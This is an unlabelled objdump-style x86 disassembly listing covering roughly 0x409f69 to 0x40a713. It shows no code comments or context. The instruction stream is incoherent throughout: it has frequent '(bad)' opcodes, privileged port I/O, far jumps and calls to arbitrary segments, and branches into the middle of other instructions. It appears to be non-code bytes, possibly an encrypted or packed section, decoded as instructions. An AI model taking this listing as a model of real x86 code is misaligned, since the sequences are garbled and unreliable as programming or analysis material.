  409f69:	gs jns 0x409f04
  409f6c:	ss or  eax,0xfdf66b49
  409f72:	xor    eax,0xd60a63aa
  409f77:	jo     0x409f7f
  409f79:	xor    BYTE PTR [edx],dl
  409f7b:	jnp    0x409f63
  409f7d:	nop
  409f7e:	shr    bh,1
  409f80:	jecxz  0x409fc5
  409f82:	xor    ch,BYTE PTR [esi-0x36]
  409f85:	in     al,dx
  409f86:	and    DWORD PTR [edi-0x5405a947],esp
  409f8c:	mov    BYTE PTR [esi+0x65],ch
  409f8f:	sub    eax,0x5443d464
  409f94:	mov    DWORD PTR [eax-0x12c960d7],ebp
  409f9a:	sub    ecx,DWORD PTR [ebx-0x11]
  409f9d:	mov    esi,0x3af168bb
  409fa2:	jmp    0xfae6:0xa482e92f
  409fa9:	(bad)  [ecx]
  409fab:	mov    ds:0x305bc814,al
  409fb0:	jmp    0x689a04b8
  409fb5:	inc    ebp
  409fb6:	mov    eax,ds:0x4ef20d5c
  409fbb:	imul   edi,DWORD PTR [esp+ebp*1+0x3b58d2ed],0xffffff81
  409fc3:	and    ebx,DWORD PTR [ebp+0x4b]
  409fc6:	sub    al,0x67
  409fc8:	fiadd  WORD PTR [edx+0x2df617cc]
  409fce:	les    edi,FWORD PTR [eax+ebp*2-0x3e572f61]
  409fd5:	retf   
  409fd6:	pop    ss
  409fd7:	daa    
  409fd8:	popa   
  409fd9:	lods   al,BYTE PTR ds:[esi]
  409fda:	jns    0x40a025
  409fdc:	pop    ebx
  409fdd:	inc    esi
  409fde:	rcl    DWORD PTR [esi+ecx*8-0x2e],1
  409fe2:	xchg   edx,eax
  409fe3:	xchg   ecx,eax
  409fe4:	mov    edx,DWORD PTR [esi+edi*2]
  409fe7:	jp     0x40a009
  409fe9:	pop    esp
  409fea:	jl     0x409f7a
  409fec:	mov    eax,0xe7b35a83
  409ff1:	outs   dx,BYTE PTR ds:[esi]
  409ff2:	imul   edx,DWORD PTR [ebp+0x56ecd331],0x43f714f3
  409ffc:	adc    dh,BYTE PTR [eax]
  409ffe:	pop    esp
  409fff:	inc    esi
  40a000:	mov    ah,0x86
  40a002:	stos   DWORD PTR es:[edi],eax
  40a003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a004:	dec    edi
  40a005:	pop    es
  40a006:	aam    0xf4
  40a008:	inc    esp
  40a009:	inc    esp
  40a00a:	scas   al,BYTE PTR es:[edi]
  40a00b:	or     dl,al
  40a00d:	xchg   ecx,eax
  40a00e:	and    eax,DWORD PTR [ebp-0x52]
  40a011:	in     eax,dx
  40a012:	test   al,0xa7
  40a014:	dec    ebp
  40a015:	ror    DWORD PTR es:[ebx],cl
  40a018:	and    edi,ebx
  40a01a:	pop    es
  40a01b:	pop    ebx
  40a01c:	inc    esp
  40a01d:	imul   edx,ebp,0xffffffc5
  40a020:	loopne 0x40a027
  40a022:	pop    ds
  40a023:	inc    ebp
  40a024:	into   
  40a025:	ret    
  40a026:	arpl   WORD PTR ds:0xd0663ffd,si
  40a02c:	add    eax,0x18afde52
  40a031:	test   BYTE PTR [edi],dh
  40a033:	je     0x40a071
  40a035:	mov    ch,dl
  40a037:	fcomi  st,st(3)
  40a039:	loop   0x40a030
  40a03b:	push   ds
  40a03c:	pop    esp
  40a03d:	les    esi,FWORD PTR [esi-0x13]
  40a040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a041:	mov    ecx,0x5c2f8186
  40a046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a047:	ficom  WORD PTR [eax]
  40a049:	inc    esp
  40a04a:	adc    ebp,esp
  40a04c:	bound  edi,QWORD PTR [esi]
  40a04e:	lods   eax,DWORD PTR ds:[esi]
  40a04f:	pushf  
  40a050:	clc    
  40a051:	lods   al,BYTE PTR ds:[esi]
  40a052:	sub    eax,0x255a4015
  40a057:	and    esp,DWORD PTR [ebp-0x1ed64f31]
  40a05d:	mov    al,ds:0xa758dcb7
  40a062:	retf   0x292f
  40a065:	fwait
  40a066:	cmp    eax,0x47daa6d8
  40a06b:	mov    ecx,0xa0a8e470
  40a070:	cmc    
  40a071:	aaa    
  40a072:	test   eax,0x2e15ee00
  40a077:	mov    esp,ebp
  40a079:	fisubr DWORD PTR [edi]
  40a07b:	iret   
  40a07c:	mov    edx,0xf4ea27ef
  40a081:	rol    DWORD PTR [eax+0x9],1
  40a084:	fimul  DWORD PTR [ebx+eiz*2]
  40a087:	xchg   dh,ah
  40a089:	fadd   st(4),st
  40a08b:	xchg   ebx,eax
  40a08c:	adc    eax,0x16205ddb
  40a091:	or     BYTE PTR [ebx+esi*4+0x2e],0xcf
  40a096:	mov    eax,0x4e162636
  40a09b:	cs retf 0x9209
  40a09f:	loopne 0x40a10f
  40a0a1:	outs   dx,DWORD PTR ds:[esi]
  40a0a2:	cmp    DWORD PTR [ebx+eiz*8-0x79],esi
  40a0a6:	add    bh,BYTE PTR [edx-0x6b]
  40a0a9:	dec    esp
  40a0aa:	pop    DWORD PTR [edx]
  40a0ac:	push   0x24
  40a0ae:	iret   
  40a0af:	mov    ecx,0x929b9048
  40a0b4:	rcr    BYTE PTR [esi-0x1f3aa88],cl
  40a0ba:	inc    esp
  40a0bb:	mov    bl,0xb6
  40a0bd:	mov    edx,0x8e54b04e
  40a0c2:	pop    esi
  40a0c3:	sbb    BYTE PTR [eax+0x62b13f00],al
  40a0c9:	sbb    edi,0xffffffbc
  40a0cc:	pop    esi
  40a0cd:	cwde   
  40a0ce:	jne    0x40a09d
  40a0d0:	out    0x56,eax
  40a0d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0d3:	xchg   esi,eax
  40a0d4:	or     BYTE PTR [eax-0x65d5b3dc],0x42
  40a0db:	mov    bl,0xe3
  40a0dd:	(bad)  
  40a0de:	fldenv [ebp+esi*2+0x1f]
  40a0e2:	or     DWORD PTR [ecx],edi
  40a0e4:	loop   0x40a0c6
  40a0e6:	bnd gs jmp 0x7c8d547c
  40a0ed:	call   0xa14092f8
  40a0f2:	sub    al,0x55
  40a0f4:	push   esi
  40a0f5:	add    eax,0xe53297a8
  40a0fa:	fst    QWORD PTR [edx+0x5c]
  40a0fd:	dec    ebp
  40a0fe:	and    eax,0x674fae5f
  40a103:	clc    
  40a104:	fnsave [ebx+0x71]
  40a107:	adc    ah,BYTE PTR [edi]
  40a109:	sub    BYTE PTR [edx+0x3],0x2d
  40a10d:	inc    edi
  40a10e:	ja     0x40a0a4
  40a110:	shr    DWORD PTR ds:0x84424fe2,0xcf
  40a117:	xchg   ebp,eax
  40a118:	arpl   bp,cx
  40a11a:	push   0xc52a76ba
  40a11f:	xor    dl,dh
  40a121:	xlat   BYTE PTR ds:[ebx]
  40a122:	mov    dl,BYTE PTR ss:[ebp-0x6f59dd1d]
  40a129:	cwde   
  40a12a:	jmp    0xbed75ba5
  40a12f:	mov    ?,WORD PTR [eax]
  40a131:	inc    esp
  40a132:	shr    BYTE PTR [edi+0x7],1
  40a135:	arpl   WORD PTR [esi-0x22],bx
  40a138:	scas   eax,DWORD PTR es:[edi]
  40a139:	fdivr  QWORD PTR [ebp+0x7b]
  40a13c:	nop
  40a13d:	mov    al,BYTE PTR [edi-0x4914e6a6]
  40a143:	lods   eax,DWORD PTR ss:[esi]
  40a145:	mov    dh,0x31
  40a147:	cmp    ebp,DWORD PTR fs:[ecx-0x2fef066d]
  40a14e:	sub    DWORD PTR [ebx+ebp*2+0x61],ecx
  40a152:	cs sti 
  40a154:	cmp    BYTE PTR [ebx],dl
  40a156:	fwait
  40a157:	repz cs jge 0x40a182
  40a15b:	shr    DWORD PTR [edx],cl
  40a15d:	push   ds
  40a15e:	xlat   BYTE PTR ds:[ebx]
  40a15f:	sbb    DWORD PTR [edi-0xa],edi
  40a162:	into   
  40a163:	add    al,BYTE PTR [ecx+ecx*1+0x6f]
  40a167:	aam    0x41
  40a169:	fidivr DWORD PTR [ebx+0x65]
  40a16c:	ret    
  40a16d:	and    DWORD PTR [ebx-0x5eb8918c],eax
  40a173:	jg     0x40a10b
  40a175:	sbb    al,0xf6
  40a177:	ror    BYTE PTR [edx+0x34],1
  40a17a:	dec    ebp
  40a17b:	gs pop edi
  40a17d:	jne    0x40a1b8
  40a17f:	inc    ecx
  40a180:	jg     0x40a19e
  40a182:	xchg   esp,eax
  40a183:	dec    ebp
  40a184:	popa   
  40a185:	xor    eax,0xf9cd2e61
  40a18a:	adc    al,0x44
  40a18c:	test   eax,0x4d39f9be
  40a191:	mov    fs,WORD PTR [ecx]
  40a193:	es pop ebx
  40a195:	cwde   
  40a196:	mov    al,ds:0x5ff42c29
  40a19b:	sub    eax,0x234b463d
  40a1a0:	or     BYTE PTR [ebx+ebx*4],dl
  40a1a3:	(bad)  
  40a1a4:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1a6:	mov    bl,0x9
  40a1a8:	cli    
  40a1a9:	icebp  
  40a1aa:	mov    ebx,0x7546a6ac
  40a1af:	dec    ebx
  40a1b0:	pop    ebp
  40a1b1:	push   ebp
  40a1b2:	xor    al,0xc9
  40a1b4:	mov    ecx,0x26794001
  40a1b9:	mov    ah,0x97
  40a1bb:	inc    esp
  40a1bc:	push   esp
  40a1bd:	jnp    0x40a1e7
  40a1bf:	sbb    al,BYTE PTR [ebp-0x71]
  40a1c2:	push   esi
  40a1c3:	test   cl,cl
  40a1c5:	xchg   ecx,eax
  40a1c6:	or     ah,dh
  40a1c8:	xchg   esp,eax
  40a1c9:	call   0x3c55:0xc2a75d0e
  40a1d0:	jl     0x40a241
  40a1d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1d3:	adc    ecx,DWORD PTR [ecx-0x16831f19]
  40a1d9:	mov    esp,0x47946c99
  40a1de:	data16 cmc 
  40a1e0:	cmp    edi,DWORD PTR [ecx+0x6b34865e]
  40a1e6:	fst    QWORD PTR [esi]
  40a1e8:	adc    dl,BYTE PTR [esi-0x14]
  40a1eb:	jns    0x40a269
  40a1ed:	lods   al,BYTE PTR ds:[esi]
  40a1ef:	adc    esi,DWORD PTR [ecx-0x42e15b09]
  40a1f5:	inc    edx
  40a1f6:	xchg   ebp,eax
  40a1f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1f8:	sahf   
  40a1f9:	popf   
  40a1fa:	adc    ebx,DWORD PTR [edx-0x5609541d]
  40a200:	test   DWORD PTR [edi-0x77],eax
  40a203:	cli    
  40a204:	aas    
  40a205:	xchg   DWORD PTR [ebp+0x42f5cc34],edx
  40a20b:	pop    edx
  40a20c:	cmp    DWORD PTR [eax],0xe7d135c
  40a212:	imul   ebx,DWORD PTR [eax],0xe70acffb
  40a218:	pop    ebx
  40a219:	outs   dx,DWORD PTR ds:[esi]
  40a21a:	inc    edx
  40a21b:	ss push eax
  40a21d:	imul   esp,DWORD PTR [edx+0x7f79254a],0x72d49d5a
  40a227:	fs ja  0x40a29a
  40a22a:	pop    ss
  40a22b:	sbb    bh,ch
  40a22d:	mov    ah,0x8d
  40a22f:	adc    al,0xef
  40a231:	lods   al,BYTE PTR ds:[esi]
  40a232:	jno    0x40a24b
  40a234:	pop    edx
  40a235:	in     eax,0x31
  40a237:	leave  
  40a238:	sbb    ebx,esp
  40a23a:	jmp    0x21b7:0x442da4e4
  40a241:	xchg   DWORD PTR [esi+eax*8],eax
  40a244:	mov    ebx,0x222294a9
  40a249:	test   DWORD PTR [esi-0x76abbc8a],0x11831263
  40a253:	jl     0x40a215
  40a255:	int    0xe2
  40a257:	add    ch,ch
  40a259:	push   edi
  40a25a:	push   0x3f
  40a25c:	int    0x3a
  40a25e:	repnz adc ecx,ebp
  40a261:	(bad)  
  40a262:	mov    ds:0x1ac1513d,al
  40a267:	neg    al
  40a269:	mov    DWORD PTR [ecx-0x42],eax
  40a26c:	call   0x58a:0x7f1dfc6c
  40a273:	ja     0x40a2e8
  40a275:	or     edi,DWORD PTR [ecx+0x0]
  40a278:	rcl    ebx,cl
  40a27a:	jle    0x40a26c
  40a27c:	(bad)  
  40a27d:	(bad)  [edi-0x4bc82d1d]
  40a283:	les    bp,DWORD PTR [eax]
  40a286:	(bad)  
  40a287:	fldcw  WORD PTR [ebx+eiz*8]
  40a28a:	push   ds
  40a28b:	call   0x289f5328
  40a290:	mov    WORD PTR [ebx-0x5b85c3d7],cs
  40a296:	or     ah,BYTE PTR [ebp+0x19]
  40a299:	sbb    eax,0xee7d590e
  40a29e:	adc    eax,0x6b9fe296
  40a2a3:	xor    ebx,DWORD PTR [eax+0x5e4732b0]
  40a2a9:	cmc    
  40a2aa:	push   edi
  40a2ab:	fwait
  40a2ac:	cmp    BYTE PTR [edi],dl
  40a2ae:	or     eax,0xef779477
  40a2b3:	push   ds
  40a2b4:	ret    0xe7ba
  40a2b7:	push   ss
  40a2b8:	pop    esi
  40a2b9:	ror    bl,cl
  40a2bb:	out    0x7d,al
  40a2bd:	mov    cl,0x80
  40a2bf:	dec    ebx
  40a2c0:	push   edi
  40a2c1:	jmp    0x40a308
  40a2c3:	add    BYTE PTR [ebx-0x1f47bfc7],dl
  40a2c9:	outs   dx,BYTE PTR ds:[esi]
  40a2ca:	add    eax,0x4274a8d
  40a2cf:	in     eax,dx
  40a2d0:	pop    ds
  40a2d1:	nop
  40a2d2:	int3   
  40a2d3:	mov    fs,eax
  40a2d5:	xor    edx,eax
  40a2d7:	dec    esi
  40a2d8:	mov    esp,DWORD PTR [ecx]
  40a2da:	rcr    DWORD PTR [ebx-0x63],cl
  40a2dd:	ret    0xe983
  40a2e0:	loope  0x40a265
  40a2e2:	neg    BYTE PTR [eax-0x2c]
  40a2e5:	and    dh,dh
  40a2e7:	push   cs
  40a2e8:	ja     0x40a2f1
  40a2ea:	push   edi
  40a2eb:	dec    ecx
  40a2ec:	jb     0x40a32e
  40a2ee:	icebp  
  40a2ef:	mov    al,ds:0x14aa8ed3
  40a2f4:	sbb    al,0x99
  40a2f6:	dec    edi
  40a2f7:	cwde   
  40a2f8:	mov    esi,0x5c836493
  40a2fd:	adc    eax,0xe26a589d
  40a302:	and    esi,DWORD PTR [esi+esi*4-0x7dd03e73]
  40a309:	cs cmp al,0x9d
  40a30c:	pop    esi
  40a30d:	pop    ss
  40a30e:	iret   
  40a30f:	xchg   esi,esp
  40a311:	jl     0x40a357
  40a313:	inc    edi
  40a314:	mov    ch,0x68
  40a316:	cmp    al,0xe9
  40a318:	mov    al,0x83
  40a31a:	mov    bh,0x9a
  40a31c:	inc    ecx
  40a31d:	cli    
  40a31e:	scas   eax,DWORD PTR es:[edi]
  40a31f:	rcl    edi,0x14
  40a322:	leave  
  40a323:	mov    ecx,0x82677a38
  40a328:	leave  
  40a329:	mov    al,ds:0x71ae16cf
  40a32e:	push   eax
  40a32f:	(bad)  
  40a331:	pop    ecx
  40a332:	in     al,dx
  40a333:	out    dx,al
  40a334:	and    ecx,ebp
  40a336:	mov    edx,0x17286c51
  40a33b:	push   ss
  40a33c:	test   DWORD PTR [edi-0x158d1623],ecx
  40a342:	push   esi
  40a343:	test   DWORD PTR [ebp-0x10],ebx
  40a346:	dec    esi
  40a347:	mov    ebx,0x6832e1df
  40a34c:	inc    ebp
  40a34d:	xchg   esp,eax
  40a34e:	repnz rcl BYTE PTR [eax+0x5f],1
  40a352:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a353:	pop    ebx
  40a354:	in     al,dx
  40a355:	add    DWORD PTR [esp+eiz*2+0x50],0x451ed83e
  40a35d:	ret    
  40a35e:	das    
  40a35f:	xchg   BYTE PTR [ecx],al
  40a361:	ds cmp eax,0xe94d2499
  40a367:	(bad)  
  40a369:	sbb    DWORD PTR [ecx],0xffffff99
  40a36c:	sti    
  40a36d:	and    eax,0x92b4a602
  40a372:	retf   
  40a373:	xor    BYTE PTR [ebp+0x24],0x28
  40a377:	xchg   edi,eax
  40a378:	addr16 jo 0x40a337
  40a37b:	add    al,0xa1
  40a37d:	push   ebp
  40a37e:	loop   0x40a377
  40a380:	sub    ecx,edi
  40a382:	(bad)  
  40a383:	sbb    esp,DWORD PTR [edi]
  40a385:	and    eax,0x597c5657
  40a38a:	jbe    0x40a39f
  40a38c:	imul   ebp,DWORD PTR [ebp-0x4d9dcc36],0x11
  40a393:	in     eax,0x7a
  40a395:	sub    edx,DWORD PTR [eax]
  40a397:	jp     0x40a374
  40a399:	int3   
  40a39a:	or     DWORD PTR [ecx],0x1e
  40a39d:	addr16 mov cl,0x43
  40a3a0:	fbld   TBYTE PTR [ebp+0x66]
  40a3a3:	dec    esi
  40a3a4:	ror    ch,0x1
  40a3a7:	ja     0x40a3bb
  40a3a9:	test   DWORD PTR [edi+0x5329bda5],ebp
  40a3af:	ja     0x40a365
  40a3b1:	add    dl,dh
  40a3b3:	fcmovb st,st(1)
  40a3b5:	cld    
  40a3b6:	data16 sar BYTE PTR [edx],0xce
  40a3ba:	fst    DWORD PTR [edx]
  40a3bc:	mul    BYTE PTR [ebx]
  40a3be:	mov    ch,0x3f
  40a3c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3c1:	xlat   BYTE PTR ds:[ebx]
  40a3c2:	add    eax,0xe982b2dd
  40a3c7:	cmp    DWORD PTR [eax],ecx
  40a3c9:	and    BYTE PTR [eax+0x37],0x41
  40a3cd:	cmp    eax,0x20fbb827
  40a3d2:	mov    ch,0x42
  40a3d4:	fidivr WORD PTR [ebp-0x6c834f]
  40a3da:	call   0xbd6d:0x7a508adf
  40a3e1:	adc    BYTE PTR [ebp-0x66],al
  40a3e4:	out    0x7a,al
  40a3e6:	cmp    ebx,DWORD PTR [ecx-0x22e286b0]
  40a3ec:	jg     0x40a44d
  40a3ee:	pop    ecx
  40a3ef:	repnz cmp dl,bl
  40a3f2:	xor    al,0xc3
  40a3f4:	pop    ebp
  40a3f5:	xor    BYTE PTR [edx+0x28d7a300],cl
  40a3fb:	adc    eax,0x29bb2fb8
  40a400:	aad    0xeb
  40a402:	mov    ch,0xc8
  40a404:	jmp    0x40a3f7
  40a406:	add    BYTE PTR [esi],cl
  40a408:	add    DWORD PTR [eax+0x74cdce3a],esp
  40a40e:	mov    ebx,0x2e8dd134
  40a413:	in     eax,0xab
  40a415:	jge    0x40a3e0
  40a417:	fs inc ebx
  40a419:	and    ebp,edi
  40a41b:	mov    eax,ds:0x816b57ea
  40a420:	outs   dx,DWORD PTR ds:[esi]
  40a421:	add    cl,BYTE PTR [edx-0x1c91c102]
  40a427:	mov    WORD PTR [eax-0x2e63ad0],fs
  40a42d:	ins    DWORD PTR es:[edi],dx
  40a42e:	rcl    BYTE PTR [esi],1
  40a430:	cmc    
  40a431:	vmaxsd xmm6,xmm2,QWORD PTR [esi]
  40a435:	pop    ebp
  40a436:	mov    cl,0x6e
  40a438:	pop    esp
  40a439:	mov    edi,0x231c63cc
  40a43e:	mov    edi,0x9178f654
  40a443:	push   ecx
  40a444:	mov    cs,WORD PTR [ebp-0x5c]
  40a447:	stos   DWORD PTR es:[edi],eax
  40a448:	adc    ch,bl
  40a44a:	cmp    eax,0x7b319db5
  40a44f:	push   ebx
  40a450:	loope  0x40a423
  40a452:	fist   DWORD PTR [eax+0x50dff5cb]
  40a458:	lods   eax,DWORD PTR ds:[esi]
  40a459:	retfw  0x15df
  40a45d:	rol    DWORD PTR [edx-0x31],1
  40a460:	push   0x2b09759b
  40a465:	mov    edx,0x1fba8e0a
  40a46a:	imul   ebp,edi,0xffffffbb
  40a46d:	shl    DWORD PTR [esi-0xe8d495b],1
  40a473:	enter  0x9bb7,0x63
  40a477:	cdq    
  40a478:	inc    esi
  40a479:	test   eax,edi
  40a47b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a47c:	inc    ebp
  40a47d:	dec    esp
  40a47e:	cwde   
  40a47f:	or     al,0x0
  40a481:	and    BYTE PTR [ebx],bl
  40a483:	adc    DWORD PTR [edx],ebp
  40a485:	add    edi,DWORD PTR [esi-0x14d39e1b]
  40a48b:	std    
  40a48c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a48d:	mov    edx,0x43f228c5
  40a492:	int3   
  40a493:	jmp    0x40a4ff
  40a495:	mov    ebx,0x7bafae4d
  40a49a:	out    0x36,eax
  40a49c:	mov    dl,0x82
  40a49e:	ss sbb al,0xa
  40a4a1:	sub    eax,0x35be7964
  40a4a6:	lods   al,BYTE PTR ds:[esi]
  40a4a7:	imul   edi,DWORD PTR [ebx-0x70],0xab61abfe
  40a4ae:	out    0x9a,al
  40a4b0:	ja     0x40a4ab
  40a4b2:	repnz fstp DWORD PTR [ebp+0x42899132]
  40a4b9:	shl    BYTE PTR [edx],cl
  40a4bb:	into   
  40a4bc:	pop    ebx
  40a4bd:	(bad)
  40a4c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4c1:	jmp    0xeb4b:0xc9d3bc50
  40a4c8:	fist   DWORD PTR [ecx]
  40a4ca:	retf   
  40a4cb:	xchg   ch,dl
  40a4cd:	call   0xd8d7e37f
  40a4d2:	adc    esp,DWORD PTR [ebx+0x4238a305]
  40a4d8:	gs int3 
  40a4da:	popf   
  40a4db:	and    esp,DWORD PTR [edi+0x78]
  40a4de:	xchg   esi,eax
  40a4df:	lahf   
  40a4e0:	dec    esp
  40a4e1:	fst    st(7)
  40a4e3:	ficomp WORD PTR [ebx-0x2019ae82]
  40a4e9:	and    BYTE PTR [ebx-0x7e],bh
  40a4ec:	icebp  
  40a4ed:	mov    bl,0x16
  40a4ef:	fnstsw WORD PTR [edx+0x39]
  40a4f2:	sbb    eax,0xec693
  40a4f7:	sar    DWORD PTR [ebx-0x6a],0x62
  40a4fb:	adc    ebx,edx
  40a4fd:	imul   edi,DWORD PTR [eax],0x8db9872c
  40a503:	push   ecx
  40a504:	adc    eax,0x6de61de3
  40a509:	jmp    0xa17d7da4
  40a50e:	mov    edi,0xcf69adf6
  40a513:	jecxz  0x40a511
  40a515:	out    dx,al
  40a516:	aam    0xb2
  40a518:	inc    ecx
  40a519:	cmp    DWORD PTR [edi+esi*8+0x36],esp
  40a51d:	xchg   esi,eax
  40a51e:	pop    esi
  40a51f:	fld    DWORD PTR [edx+0x3e950716]
  40a525:	fistp  QWORD PTR [edx+0x50445f67]
  40a52b:	dec    ebp
  40a52c:	nop
  40a52d:	mov    bl,0x44
  40a52f:	inc    ebp
  40a530:	repz sbb DWORD PTR [ebp+0x311a6c91],esi
  40a537:	pop    edi
  40a538:	sub    BYTE PTR [ecx],dl
  40a53a:	pop    es
  40a53b:	sbb    BYTE PTR [edx],ah
  40a53d:	jmp    0xc780:0xb856e4f5
  40a544:	mov    ah,0x71
  40a546:	inc    ecx
  40a547:	cld    
  40a548:	addr16 div dl
  40a54b:	lods   al,BYTE PTR ds:[esi]
  40a54c:	cwde   
  40a54d:	push   0x5c
  40a54f:	js     0x40a570
  40a551:	retf   
  40a552:	sbb    DWORD PTR [esp+esi*1-0xad99941],ecx
  40a559:	xlat   BYTE PTR ds:[ebx]
  40a55a:	jecxz  0x40a524
  40a55c:	xchg   esi,eax
  40a55d:	xchg   edi,eax
  40a55e:	outs   dx,DWORD PTR ds:[esi]
  40a55f:	xor    eax,ebx
  40a561:	jl     0x40a596
  40a563:	data16 fiadd WORD PTR [eax]
  40a566:	dec    eax
  40a567:	ror    BYTE PTR [edx-0x4b83b76c],cl
  40a56d:	lods   al,BYTE PTR ds:[esi]
  40a56e:	and    bh,BYTE PTR [ecx-0x2]
  40a571:	or     eax,0xb87740ce
  40a576:	xchg   ecx,eax
  40a577:	imul   esp,DWORD PTR [edi],0xffffffdd
  40a57a:	push   eax
  40a57b:	and    al,0x5e
  40a57d:	add    BYTE PTR [ebp-0xb],bl
  40a580:	imul   edx,ebx,0xf00d8456
  40a586:	add    DWORD PTR [ebx+0x7a],esi
  40a589:	aaa    
  40a58a:	ins    BYTE PTR es:[edi],dx
  40a58b:	sub    edx,0x57e62ae0
  40a591:	mov    al,ds:0x935401a8
  40a596:	sub    BYTE PTR [ebp-0x557a7043],ah
  40a59c:	pop    eax
  40a59d:	cmp    eax,DWORD PTR [ebp+0x3d186dd6]
  40a5a3:	xchg   esi,eax
  40a5a4:	fnstcw WORD PTR [ecx]
  40a5a6:	push   ds
  40a5a7:	mov    ch,0xc0
  40a5a9:	adc    ch,al
  40a5ab:	fst    DWORD PTR ds:[ebx]
  40a5ae:	xor    edi,DWORD PTR [ebx+ebp*4+0xbb89688]
  40a5b5:	xchg   edi,eax
  40a5b6:	int    0x1a
  40a5b8:	mov    al,0x84
  40a5ba:	les    ecx,FWORD PTR [ecx-0x15]
  40a5bd:	mov    bh,0x6d
  40a5bf:	mov    edi,DWORD PTR [ecx]
  40a5c1:	jns    0x40a55b
  40a5c3:	shr    DWORD PTR ds:0xa3a182b8,cl
  40a5c9:	mov    DWORD PTR [ecx+0x6b],esi
  40a5cc:	add    ebp,DWORD PTR [ebp-0x7c]
  40a5cf:	or     al,0xed
  40a5d1:	push   esi
  40a5d2:	dec    ebx
  40a5d3:	lods   al,BYTE PTR ds:[esi]
  40a5d4:	adc    edi,esp
  40a5d6:	cdq    
  40a5d7:	cwde   
  40a5d8:	gs call 0xc5c8:0x62696dd9
  40a5e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5e1:	fnstsw WORD PTR [edi+0x73d8b8a2]
  40a5e7:	sub    BYTE PTR [edx+0x8],bh
  40a5ea:	add    esp,DWORD PTR [edx-0x6546af45]
  40a5f0:	repnz mov DWORD PTR [esp+ebx*1],0x7837a669
  40a5f8:	not    DWORD PTR [ecx+0x24]
  40a5fb:	jmp    0x40a5f6
  40a5fd:	test   ebx,ebp
  40a5ff:	std    
  40a600:	xor    al,0x3d
  40a602:	push   edx
  40a603:	repz call 0x989f2e06
  40a609:	(bad)  
  40a60a:	jmp    0x9868f73d
  40a60f:	sbb    esp,DWORD PTR [ecx]
  40a611:	or     ebp,esi
  40a613:	sub    esp,DWORD PTR [esi-0x57]
  40a616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a617:	inc    ecx
  40a618:	sbb    BYTE PTR [ebp-0xd],bh
  40a61b:	xor    eax,0x2938b238
  40a620:	jmp    0x40a5d9
  40a622:	or     BYTE PTR [ebx+0x380379c1],dl
  40a628:	clc    
  40a629:	mov    esi,0xdc6c2428
  40a62e:	inc    ebp
  40a62f:	and    BYTE PTR ds:0x76220e89,bl
  40a635:	dec    ebx
  40a636:	add    ecx,edi
  40a638:	jb     0x40a5e8
  40a63a:	pop    ds
  40a63b:	cld    
  40a63c:	(bad)  
  40a63d:	jmp    0xa3bdfc8
  40a642:	jle    0x40a6a0
  40a644:	mov    dh,BYTE PTR ds:0x73f13fdc
  40a64a:	cdq    
  40a64b:	sbb    dh,BYTE PTR [eax]
  40a64d:	jle    0x40a5db
  40a64f:	push   ebp
  40a650:	jne    0x40a624
  40a652:	mov    bh,0xb8
  40a654:	dec    edi
  40a655:	push   ebp
  40a656:	bound  ebp,QWORD PTR [eax-0x3f659ef0]
  40a65c:	retf   
  40a65d:	mov    esi,0x5b46fc9
  40a662:	lock arpl WORD PTR [esi],bp
  40a665:	sub    esi,DWORD PTR [edi+0x118c354b]
  40a66b:	(bad)  
  40a66c:	stc    
  40a66d:	jmp    DWORD PTR fs:[ebp-0x2bf481ba]
  40a674:	xor    BYTE PTR [edi-0x370bf763],al
  40a67a:	jmp    0xea86:0xd231e132
  40a681:	mov    ch,dh
  40a683:	hlt    
  40a684:	adc    ch,cl
  40a686:	and    bl,bl
  40a688:	stc    
  40a689:	sub    al,0x5
  40a68b:	sti    
  40a68c:	mov    bl,0x4c
  40a68e:	sub    ebx,DWORD PTR [esi]
  40a690:	cli    
  40a691:	out    dx,al
  40a692:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a693:	mov    bh,0xde
  40a695:	les    esi,FWORD PTR [ebx-0x17]
  40a698:	imul   DWORD PTR ss:[edi+0x5a]
  40a69c:	mov    esi,0xb4dd36a7
  40a6a1:	jle    0x40a66f
  40a6a3:	cmp    al,0x31
  40a6a5:	mov    edx,0x897be2e9
  40a6aa:	out    0xa5,al
  40a6ac:	xor    DWORD PTR [esi],ebp
  40a6ae:	mul    BYTE PTR [edi+esi*8+0x6d806196]
  40a6b5:	mov    ds:0xbfde69a7,al
  40a6ba:	cmp    ah,0xff
  40a6bd:	mov    fs,ecx
  40a6bf:	and    BYTE PTR [esi+0x5ddf2044],al
  40a6c5:	ins    BYTE PTR es:[edi],dx
  40a6c6:	fs cmp eax,0x942e22a7
  40a6cc:	push   ebp
  40a6cd:	jl     0x40a6c7
  40a6cf:	or     ch,BYTE PTR [esi]
  40a6d1:	mov    ch,0x88
  40a6d3:	jb     0x40a67e
  40a6d5:	jecxz  0x40a70e
  40a6d7:	(bad)  
  40a6d8:	std    
  40a6d9:	ins    BYTE PTR es:[edi],dx
  40a6da:	and    edi,DWORD PTR [eax]
  40a6dc:	mov    DWORD PTR [edx-0x74bfe8d0],edx
  40a6e2:	xchg   esp,eax
  40a6e3:	mov    ah,0x28
  40a6e5:	xchg   esi,eax
  40a6e6:	cmp    DWORD PTR [edi+0x3e36c7ac],0x73
  40a6ed:	xor    DWORD PTR [eax+0x6b],edi
  40a6f0:	mov    eax,0xe1590c65
  40a6f5:	jp     0x40a6d0
  40a6f7:	leave  
  40a6f8:	mov    al,0xc
  40a6fa:	mov    ds:0x27caf186,al
  40a6ff:	fwait
  40a700:	push   ss
  40a701:	dec    ecx
  40a702:	push   ecx
  40a704:	push   0xffffffb9
  40a706:	pop    es
  40a707:	push   0x7a79a17f
  40a70c:	jmp    0x7932:0x10d1fd9a
  40a713:	xor    eax,0x670c7971
